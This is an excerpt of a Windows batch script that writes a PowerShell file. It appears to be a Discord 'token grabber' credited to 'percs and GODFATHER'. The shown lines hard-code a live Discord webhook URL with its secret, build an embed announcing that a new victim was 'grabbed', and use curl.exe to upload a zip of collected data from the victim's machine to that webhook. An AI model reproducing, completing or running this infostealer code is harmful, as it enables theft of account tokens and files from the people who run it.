...
echo     $webhook = "https://discordapp.com/api/webhooks/1093021907898597387/MZgfJUDaT9nHH4c5fBGCqQxqDlXPZ4MwjskfQQm4o3RNC1yYRak2J-AL6tX-67DFK9XI" >> powershell.ps1
...
echo         "username" = "percs" >> powershell.ps1
echo         "content" = "@everyone" >> powershell.ps1
echo         "title" = "percs" >> powershell.ps1
echo         "description" = "percs" >> powershell.ps1
...
echo                 "url" = "https://discord.gg/vk3rBhcj2y" >> powershell.ps1
echo                 "description" = "New person grabbed using percs's TOKEN GRABBER" >> powershell.ps1
echo                 "color" = "16711680" >> powershell.ps1
echo                 "footer" = @{ >> powershell.ps1
echo                     "text" = "Made by percs and GODFATHER" >> powershell.ps1
echo                 } >> powershell.ps1
...
echo     curl.exe -X POST -F 'payload_json={\"username\": \"KING percs\", \"content\": \"\", \"avatar_url\": \"https://cdn.discordapp.com/avatars/1009510570564784169/c4079a69ab919800e0777dc2c01ab0da.png\"}' -F "file=@$lol\percs.zip" $webhook >> powershell.ps1
